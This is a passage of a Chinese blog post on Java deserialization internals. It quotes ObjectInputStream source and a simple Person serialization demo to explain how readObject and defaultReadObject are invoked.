&#125;</span><br><span class="line"></span><br><span class="line">如果类实现了该接口，那么 unserialize() 会自动调用 unserialize($data) 方法（不是 __wakeup()）。</span><br></pre></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/4.png" class=""><ul><li>所有变量和方法会被调用吗？不会，仅调用特定钩子方法（如 <code>readObject()</code> &#x2F; <code>__wakeup()</code> &#x2F; <code>__reduce__()</code> 等）</li><li>哪些语言反序列化最危险？Java、PHP、Python、.NET 都很危险</li><li>有什么安全语言或机制？JSON &#x2F; YAML &#x2F; Protocol Buffers（如果不带执行逻辑）相对安全</li><li>是否所有语言都跳过构造函数？不全是，例如 Ruby 会调用构造函数，.NET 有条件调用</li></ul><p>那么为什么hashMap自己重写的readObject会在反序列化的时候被调用？</p><p><strong>因为 Java 的反序列化机制中规定：</strong><br>如果某个类定义了 <code>private void readObject(ObjectInputStream in)</code> 方法，反序列化时，JVM 会优先调用这个方法来自定义恢复过程，而不是使用默认机制。</p><h2 id="特别强调"><a href="#特别强调" class="headerlink" title="特别强调"></a>特别强调</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#必须要是</span><br><span class="line">private void readObject(ObjectInputStream in)</span><br><span class="line">    throws IOException, ClassNotFoundException</span><br><span class="line">#如果签名不对，JVM 就不会认这个方法，更不会自动调用</span><br></pre></td></tr></table></figure><h2 id="特殊签名"><a href="#特殊签名" class="headerlink" title="特殊签名"></a>特殊签名</h2><p>private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException<br>感觉这个也是很随意的呀，哪里看得出固定签名？</p><p>它之所以能被 JVM 反序列化机制自动调用，完全是因为它的“签名”被严格规定在了 <mark>Java 的序列化协议中</mark>，不是靠注解、接口、继承，而是靠 Java 语言规范和 <code>ObjectInputStream</code> 的源码 (反射)实现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">private void readSerialData(Object obj, ObjectStreamClass desc)throws IOException</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; slots.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">            ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">            if (slots[i].hasData) &#123;</span><br><span class="line"></span><br><span class="line">                if (obj == null || handles.lookupException(passHandle) != null) &#123;</span><br><span class="line"></span><br><span class="line">                    defaultReadFields(null, slotDesc); // skip field values</span><br><span class="line"></span><br><span class="line">//这里的if判断段是核心结构</span><br><span class="line">                &#125; else if (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line"></span><br><span class="line">                    ThreadDeath t = null;</span><br><span class="line"></span><br><span class="line">                    boolean reset = false;</span><br><span class="line"></span><br><span class="line">                    SerialCallbackContext oldContext = curContext;</span><br><span class="line"></span><br><span class="line">                    if (oldContext != null)</span><br><span class="line"></span><br><span class="line">                        oldContext.check();</span><br><span class="line"></span><br><span class="line">                    try &#123;</span><br><span class="line"></span><br><span class="line">                        curContext = new SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                        bin.setBlockDataMode(true);</span><br><span class="line"></span><br><span class="line">                        slotDesc.invokeReadObject(obj, this);</span><br><span class="line"></span><br><span class="line">                    &#125; catch (ClassNotFoundException ex) &#123;</span><br><span class="line"></span><br><span class="line">                        /*</span><br><span class="line"></span><br><span class="line">                         * In most cases, the handle table has already</span><br><span class="line"></span><br><span class="line">                         * propagated a CNFException to passHandle at this</span><br><span class="line"></span><br><span class="line">                         * point; this mark call is included to address cases</span><br><span class="line"></span><br><span class="line">                         * where the custom readObject method has cons&#x27;ed and</span><br><span class="line"></span><br><span class="line">                         * thrown a new CNFException of its own.</span><br><span class="line"></span><br><span class="line">                         */</span><br><span class="line"></span><br><span class="line">                        handles.markException(passHandle, ex);</span><br><span class="line"></span><br><span class="line">                    &#125; finally &#123;</span><br><span class="line"></span><br><span class="line">                        do &#123;</span><br><span class="line"></span><br><span class="line">                            try &#123;</span><br><span class="line"></span><br><span class="line">                                curContext.setUsed();</span><br><span class="line"></span><br><span class="line">                                if (oldContext!= null)</span><br><span class="line"></span><br><span class="line">                                    oldContext.check();</span><br><span class="line"></span><br><span class="line">                                curContext = oldContext;</span><br><span class="line"></span><br><span class="line">                                reset = true;</span><br><span class="line"></span><br><span class="line">                            &#125; catch (ThreadDeath x) &#123;</span><br><span class="line"></span><br><span class="line">                                t = x;  // defer until reset is true</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125; while (!reset);</span><br><span class="line"></span><br><span class="line">                        if (t != null)</span><br><span class="line"></span><br><span class="line">                            throw t;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                    /*</span><br><span class="line"></span><br><span class="line">                     * defaultDataEnd may have been set indirectly by custom</span><br><span class="line"></span><br><span class="line">                     * readObject() method when calling defaultReadObject() or</span><br><span class="line"></span><br><span class="line">                     * readFields(); clear it to restore normal read behavior.</span><br><span class="line"></span><br><span class="line">                     */</span><br><span class="line"></span><br><span class="line">                    defaultDataEnd = false;</span><br><span class="line"></span><br><span class="line">                &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                    defaultReadFields(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">                if (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line"></span><br><span class="line">                    skipCustomData();</span><br><span class="line"></span><br><span class="line">                &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(false);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; else &#123;</span><br><span class="line"></span><br><span class="line">                if (obj != null &amp;&amp;</span><br><span class="line"></span><br><span class="line">                    slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line"></span><br><span class="line">                    handles.lookupException(passHandle) == null)</span><br><span class="line"></span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>我贴的很全(   但是不要全看，只看今天着重强调的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">if (slots[i].hasData) &#123;</span><br><span class="line">            if (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                // 核心调用：反射调用 readObject()</span><br><span class="line">                slotDesc.invokeReadObject(obj, this);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">            //否则执行默认反序列化</span><br><span class="line">                defaultReadFields(obj, slotDesc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//那么hasReadObjectMethod()做了什么呢？</span><br><span class="line">    boolean hasReadObjectMethod() &#123;</span><br><span class="line"></span><br><span class="line">        requireInitialized();</span><br><span class="line"></span><br><span class="line">        return (readObjectMethod != null);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//那么requireInitialized又是什么呢()</span><br><span class="line"></span><br><span class="line">    private final void requireInitialized() &#123;</span><br><span class="line">//确保ObjectStreamClass已经完成初始化，已经扫描过是否存在readObject()等方法</span><br><span class="line">        if (!initialized)</span><br><span class="line"></span><br><span class="line">            throw new InternalError(&quot;Unexpected call when not initialized&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了防止越写越多导致不明所以，在此直接写下流程<br>以下是你写的测试代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class A implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        System.out.println(&quot;我是自定义readObject&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>如果你定义了这个方法：</p><ul><li><code>getPrivateMethod(...)</code> 会找到它并赋值给 <code>readObjectMethod</code></li><li><code>hasReadObjectMethod()</code> 返回 true → <code>invokeReadObject()</code> 会调用它</li></ul></li><li><p>如果你没写或写错签名（比如是 public、参数不是 ObjectInputStream）：</p><ul><li><code>readObjectMethod == null</code> → <code>hasReadObjectMethod()</code> 返回 false → 自动走默认反序列化</li></ul></li></ul><p>这里的getPrivateMethod()是如何进行查找的，invokeReadObject()是如何进行调用的 便不再论述</p><h2 id="特别钩子"><a href="#特别钩子" class="headerlink" title="特别钩子"></a>特别钩子</h2><p>类似于PHP的魔术方法(因为本人先学的php所以捏他一个php的”魔术方法“)<br>这些方法本质上确实就是 Java 的魔术方法：</p><table><thead><tr><th>方法签名</th><th>触发阶段</th><th>用途</th><th>调用者源码位置</th></tr></thead><tbody><tr><td><code>private void readObject(ObjectInputStream in)</code></td><td>反序列化时</td><td>自定义字段读取、逻辑处理</td><td><code>ObjectStreamClass.invokeReadObject(...)</code></td></tr><tr><td><code>private void readObjectNoData()</code></td><td>反序列化但类无数据时</td><td>处理版本不兼容情况</td><td><code>ObjectStreamClass.invokeReadObjectNoData(...)</code></td></tr><tr><td><code>private Object readResolve()</code></td><td>反序列化完成后</td><td>替换反序列化结果对象</td><td><code>ObjectInputStream.readObject0()</code></td></tr><tr><td><code>private void writeObject(ObjectOutputStream out)</code></td><td>序列化时</td><td>自定义字段写出、控制序列化内容</td><td><code>ObjectStreamClass.invokeWriteObject(...)</code></td></tr><tr><td><code>private Object writeReplace()</code></td><td>序列化前</td><td>替换待序列化对象</td><td><code>ObjectOutputStream.writeObject0()</code></td></tr></tbody></table><h1 id="关于defaultReadObject-函数功能的说明"><a href="#关于defaultReadObject-函数功能的说明" class="headerlink" title="关于defaultReadObject()函数功能的说明"></a>关于defaultReadObject()函数功能的说明</h1><p>如果你真的去进行了尝试，就会遇到defaultReadObject()这个函数，那么它又是谁，发挥了什么作用呢？</p><h2 id="从一个例子开始"><a href="#从一个例子开始" class="headerlink" title="从一个例子开始"></a>从一个例子开始</h2><p>这里有如下两个代码程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#Person.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 添加这个构造方法就能匹配 &quot;Alice&quot;, 30</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">        this.age = age;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream in)</span><br><span class="line"></span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        //in.defaultReadObject(); // 必须写！</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;反序列化后，name = &quot; + name + &quot;, age = &quot; + age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#TestPersion.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public class TestPerson &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        // 序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        Person p = new Person(&quot;Alice&quot;, 30);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(p);</span><br><span class="line"></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已序列化。&quot;);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // 反序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        Person p2 = (Person) ois.readObject(); // 此处会触发 readObject</span><br><span class="line"></span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已反序列化。&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#Person.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Person implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    //  添加这个构造方法就能匹配 &quot;Alice&quot;, 30</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">        this.age = age;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream in)</span><br><span class="line"></span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        //in.defaultReadObject(); // 必须写！</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;反序列化后，name = &quot; + name + &quot;, age = &quot; + age);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#TestPersion.java</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">public class TestPerson &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        //  序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        Person p = new Person(&quot;Alice&quot;, 30);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = new FileOutputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(p);</span><br><span class="line"></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已序列化。&quot;);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        //  反序列化 Person 对象</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = new FileInputStream(&quot;person.ser&quot;);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">        Person p2 = (Person) ois.readObject(); // 此处会触发 readObject</span><br><span class="line"></span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;对象已反序列化。&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前者运行结果为</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/5.png" class=""><p>后者运行结果为</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/6.png" class=""><p>两个代码程序实现的都是在Person.java中继承序列化写一个Person对象，然后重写readObject()函数，在TestPerson主程序中序列化Person对象，然后进行反序列化输出结果</p><p>但问题出在<mark>代码程序的第一个Person.java前者注释掉了defaultReadObject()而后者没有</mark></p><p>别急，这不是一句废话，这说明defaultReadObject()函数是 Java 序列化协议中约定的方法，没有它，对象字段就不会被正常恢复，用于将对象的非 transient、非 static 字段从输入流中恢复成当前对象的实际值</p><h2 id="结合源码来深入分析"><a href="#结合源码来深入分析" class="headerlink" title="结合源码来深入分析"></a>结合源码来深入分析</h2><p>结合源码来看，将讲解标记在注释里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#defaultReadObject()源码</span><br><span class="line">public void defaultReadObject()</span><br><span class="line">        throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    // 从当前线程上下文中获取序列化上下文对象（当前正在反序列化哪个对象）</span><br><span class="line">    SerialCallbackContext ctx = curContext;</span><br><span class="line">    if (ctx == null) &#123;</span><br><span class="line">        // 如果当前不是在 readObject() 中调用，则抛异常</span><br><span class="line">        throw new NotActiveException(&quot;not in call to readObject&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取当前对象和它的类描述符</span><br><span class="line">    Object curObj = ctx.getObj();           // 当前正在反序列化的对象</span><br><span class="line">    ObjectStreamClass curDesc = ctx.getDesc(); // 它的序列化类描述符</span><br><span class="line"></span><br><span class="line">    // 设置读取模式为非块模式（即从当前流中按字段读取）</span><br><span class="line">    bin.setBlockDataMode(false);</span><br><span class="line"></span><br><span class="line">    // 关键：读取并恢复对象的字段</span><br><span class="line">    defaultReadFields(curObj, curDesc); // 核心逻辑：把字段值写入对象</span><br><span class="line"></span><br><span class="line">    // 恢复数据块模式（恢复为 block 模式）</span><br><span class="line">    bin.setBlockDataMode(true);</span><br><span class="line"></span><br><span class="line">    // 如果序列化数据中不含 writeObject 写入的内容（没有 TC_ENDBLOCKDATA）</span><br><span class="line">    if (!curDesc.hasWriteObjectData()) &#123;</span><br><span class="line">        // 模拟“读取完自定义数据块”的标志，供后续使用</span><br><span class="line">        defaultDataEnd = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 如果这个对象在 handle 表中有记录异常，就重新抛出</span><br><span class="line">    ClassNotFoundException ex = handles.lookupException(passHandle);</span><br><span class="line">    if (ex != null) &#123;</span><br><span class="line">        throw ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码可以看到他是使用defauleReadFields()核心函数读取字段值并且赋值给当前对象，于是我们继续深入核心ObjectInputStream.defaultReadFields()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 